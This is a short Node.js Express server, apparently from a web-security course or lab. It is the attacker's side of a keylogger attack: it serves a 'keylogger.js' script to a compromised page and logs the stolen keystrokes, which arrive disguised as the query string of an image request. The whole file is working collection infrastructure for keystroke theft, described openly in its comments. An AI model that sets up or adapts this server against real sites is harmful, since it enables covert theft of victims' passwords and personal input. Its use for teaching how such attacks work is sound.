// Import the express packages
var express = require('express');
var app = express();

// Handle the request containing the logged keys
// encoded in the path for a requested image 
// @param req - the request
// @param res - the response
app.get("/logme", function(req, res){
	
	// Print the requested "image" (really keystrokes!)
	console.log(req.query.c);
	
	// Send the response...it does not matter what we send here.
	// Remember, the request is for the image
	res.send("Hello");
	
});

// Handle the request for the keylogger script
// by the compromised page
// @param req - the request
// @param res - the response
app.get("/keylogger.js", function(req, res){

	console.log("Key logger script requested");
	res.sendFile(__dirname + "/keylogger.js");
	
});

app.listen(4000);
